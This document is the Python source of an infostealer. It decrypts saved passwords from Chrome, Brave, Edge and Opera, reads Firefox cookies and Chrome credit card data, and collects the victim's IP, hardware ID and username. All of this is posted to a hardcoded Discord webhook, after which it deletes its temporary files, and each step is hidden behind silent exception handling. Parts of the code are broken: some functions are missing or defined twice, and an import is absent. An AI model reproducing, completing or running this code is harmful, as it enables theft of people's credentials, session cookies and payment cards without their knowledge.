import requests, os,ntpath,re, sqlite3,json,sys,win32crypt,pyfiglet
from shutil import copy2
from base64 import b64decode
from win32crypt import CryptUnprotectData
from subprocess import PIPE, Popen
from pyfiglet import Figlet
nom_utilisateur = os.getlogin()
nom_pc = os.getenv("COMPUTERNAME")

def ascii_art(fonts, text):

  custom_fig = Figlet(font=fonts)
  return custom_fig.renderText(text)


def initialize():
  global notrewebhook
  notrewebhook = "https://canary.discord.com/api/webhooks/991441429127774329/9Xoece3yh_h2xscGUmdMoRUHyEw6ekyGBvWwJt1SCXIKneXi1-UuH51UnivwP5Oyhnm8"
  try:
    pc_info()
  except:
    pass
  try:
    password_nav()
  except:
    pass
  try:
    cookie_stl()
  except:
    pass
  try:
    os.remove(f"./cookie_{nom_utilisateur}.txt")
  except:
    pass
  try:
    os.remove(f"./pswd_{nom_utilisateur}.txt")
  except:
    pass
  
def pc_info():
  global notrewebhook
  p = Popen("wmic csproduct get uuid", shell=True,
                  stdin=PIPE, stdout=PIPE, stderr=PIPE)
  hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
  info = f"IP Publiiccc(acking): {requests.get('http://ipinfo.io/json').json()['ip']}\nPC name: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('UserName')}\nHWID: {hwid}"
  embed = {
      "description": f"Information PC:```{info}```",
      "title": f":white_check_mark: - `New Client: *{nom_utilisateur}*`"
  }
  result = requests.post(notrewebhook, json={"embeds": [embed]})


def laclestpbg_chrome(path) -> str:
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            nice_value = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
            return nice_value
        except KeyError:
            return None

def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'
def cookie_stl():
  global list_cookie, notrewebhook
  list_cookie = []
  cookie_firefox()
  lc = "\n".join(list_cookie)
  embed = {
      "description": f"cooooki3 steeeelllzaaadd:\n {lc}```",
      "title": f":cook: - `ckie from *{nom_utilisateur}*`"
  }
  
  result = requests.post(notrewebhook, json={"embeds": [embed]} )
  if str(result.status_code) != "204":
    f = open(f"cookie_{nom_utilisateur}.txt", "w+")
    f.write(lc)
    f.close()
    nembed = {
      "description": f"cooooki3 steeeelllzaaadd:\n (file with)```",
      "title": f":cook: - `ckie from *{nom_utilisateur}*`"
    }
    files = {
      'file': (f'./cookie_{nom_utilisateur}.txt', open(f'./cookie_{nom_utilisateur}.txt', 'rb')),
    }
    r = requests.post(notrewebhook, json={"embeds": [nembed]}, files=files)
  else:
    pass
  #print("COOOKUIIIIEI")
  
def password_nav():
  global list_pass, notrewebhook
  list_pass = []
  pswd_chrome()
  pswd_other()
  #pswd_firefox()
  lp = "\n".join(list_pass)
  embed = {
      "description": f"pswwrd steeeelllzaaadd:\n{lp}```",
      "title": f":flushed: - `psxd of *{nom_utilisateur}*`"
  }
  result = requests.post(notrewebhook, json={"embeds": [embed]})
  if str(result.status_code) != "204":
    f = open(f"pswd_{nom_utilisateur}.txt", "w+")
    f.write(lp)
    f.close()
    nembed = {
      "description": f"pwdddddd steeeelllzaaadd:\n (file with)```",
      "title": f":flushed: - `pwd from *{nom_utilisateur}*`"
    }
    files = {
      'file': ('./pswd_{nom_utilisateur}.txt', open('./pwd_{nom_utilisateur}.txt', 'rb')),
    }
    r = requests.post(notrewebhook, json={"embeds": [nembed]}, files=files)
    

def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    global list_pass, list_cookie
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            with sqlite3.connect(LoginData) as conn:
                cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")

            list_pass.append(f"*** {name} ***\n")
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
    
                    list_pass.append(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            list_pass.append(f"{name} Login Data file missing\n")
    else:
        list_pass.append(f"{name} Local State file missing\n")

def cookie_decrypt(LocalState, LoginData, CookiesFile, name):
        global list_cookie
            ######################################################################
        if os.path.exists(CookiesFile):
            with sqlite3.connect(CookiesFile) as conn:
                curr = conn.cursor()
                conn.text_factory = lambda b: b.decode(errors = 'ignore')
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            
            list_cookie.append(f"*** {name} ***\n")
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                    list_cookie.append(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            list_cookie(f"no {name} Cookie file\n")

# PATH SHIT
def Local_State(path):
    return f"{path}\\User Data\\Local State"


def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"


def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"

def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)

    else:
        list_pass.append(browser + " not installed\n")

def decrypt_files_cookie(path, browser):
    if os.path.exists(path):
        cookie_decrypt(Local_State(path), Login_Data(path), Cookies(path), browser)
        
    else:
        list_pass.append(browser + " not installed\n")

def pswd_other():
  global list_pass
  local = os.getenv('LOCALAPPDATA')
  roaming = os.getenv('APPDATA')
  browser_loc = {
      "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
      "Edge": f"{local}\\Microsoft\\Edge",
      "Opera": f"{roaming}\\Opera Software\\Opera Stable",
      "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
  }
  for name, path in browser_loc.items():
        decrypt_files(path, name)
        

def pswd_chrome():
  global list_pass
  try:
    list_pass.append("**    - CHROME:**```")
    appdata = os.getenv("localappdata")
    chrome = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
    chrome_regex = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
    chrome_key = laclestpbg_chrome(ntpath.join(chrome, "Local State"))
    for prof in os.listdir(chrome):
      if re.match(chrome_regex, prof):
          login_db = ntpath.join(chrome, prof, 'Login Data')
          conn = sqlite3.connect(login_db)
          cursor = conn.cursor()
          cursor.execute("SELECT action_url, username_value, password_value FROM logins")

          for r in cursor.fetchall():
              url = r[0]
              username = r[1]
              encrypted_password = r[2]
              decrypted_password = decrypt_val(encrypted_password, chrome_key)
              if url != "":
                  list_pass.append(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n==========================")
          cursor.close()
          conn.close()
  except Exception as e:
    pass

def pswd_chrome():
  global list_pass
  try:
    list_pass.append("**    - CHROME:**```")
    appdata = os.getenv("localappdata")
    chrome = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
    chrome_regex = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
    chrome_key = laclestpbg_chrome(ntpath.join(chrome, "Local State"))
    for prof in os.listdir(chrome):
      if re.match(chrome_regex, prof):
          login_db = ntpath.join(chrome, prof, 'Login Data')
          conn = sqlite3.connect(login_db)
          cursor = conn.cursor()
          cursor.execute("SELECT action_url, username_value, password_value FROM logins")

          for r in cursor.fetchall():
              url = r[0]
              username = r[1]
              encrypted_password = r[2]
              decrypted_password = decrypt_val(encrypted_password, chrome_key)
              if url != "":
                  list_pass.append(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n==========================")
          cursor.close()
          conn.close()



    master_key = laclestpbg_chrome()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    conn = sqlite3.connect(login_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            print(
                "Name in Card: " + username + "\nNumber: " + decrypted_password + "\nExpire Month: " + str(
                    expire_mon) + "\nExpire Year: " + str(expire_year) + "\n" + "*" * 10 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()
  except Exception as e:
    pass

def cookie_firefox():
  global list_cookie
  if sys.platform == "win32" or sys.platform == "cygwin":
      path = os.path.join(os.path.expanduser("~"), "AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
  elif sys.platform == "darwin":
      path = os.path.join(os.path.expanduser("~"), "Library/Application Support/Firefox/Profiles")
  else:
      path = os.path.join(os.path.expanduser("~"), ".mozilla/firefox")
  subfolders = os.listdir(path)
  for subfolder in subfolders:
      cookies_file = os.path.join(os.path.join(path, subfolder), "cookies.sqlite")
      if os.path.isfile(cookies_file):
          break

  conn = sqlite3.connect(cookies_file)
  c = conn.cursor()
  c.execute("SELECT * FROM moz_cookies")
  for result in c.fetchall():
      
      result = "".join(str(result))
      list_cookie.append(result)

  conn.close()

def cookie_another():
    global list_pass
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    browser_loc = {
        "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
        "Edge": f"{local}\\Microsoft\\Edge",
        "Opera": f"{roaming}\\Opera Software\\Opera Stable",
        "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
    }
    for name, path in browser_loc.items():
        decrypt_files_cookie(path, name)
